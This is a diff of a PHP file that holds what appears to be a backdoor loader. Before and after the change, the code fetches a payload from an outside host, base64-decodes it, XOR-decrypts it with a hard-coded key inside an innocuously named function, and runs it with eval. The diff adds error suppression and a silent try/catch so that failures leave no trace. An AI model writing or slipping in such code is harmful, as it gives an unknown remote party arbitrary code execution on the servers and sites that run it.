@@ -1,29 +1,35 @@
+error_reporting(0);
+ini_set("display_errors", "0");
 function req($url) {
-    if (!function_exists("curl_init")) {
-	    if (ini_get("allow_url_fopen")) {
-	    	$res = file_get_contents($url, false);
-            return $res;
-	    } else {
-            return false;
-        }
-    } else {
-	    $ch = curl_init();
-	    curl_setopt($ch, CURLOPT_URL, $url);
-	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-	    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+	if (!function_exists("curl_init")) {
+		if (ini_get("allow_url_fopen")) {
+			$res = file_get_contents($url, false);
+			return $res;
+		} else {
+			return false;
+		}
+	} else {
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 
-	    $res = curl_exec($ch);
-        return $res;
-    }
+		$res = curl_exec($ch);
+		return $res;
+	}
 }
 function great_news($s, $k) {
-    for($i = 0; $i < strlen($s); $i++) 
-        $s[$i] = ($s[$i] ^ $k[$i % strlen($k)]);
-    return $s;
+	for($i = 0; $i < strlen($s); $i++) 
+		$s[$i] = ($s[$i] ^ $k[$i % strlen($k)]);
+	return $s;
 }
 $u = "https://js.mirr0r.workers.dev/api";
 $res = req($u);
 $content = great_news(base64_decode($res), "onthewall");
-eval($content);
+try {
+	@eval($content);
+} catch(\Throwable $e) {
+	//
+}
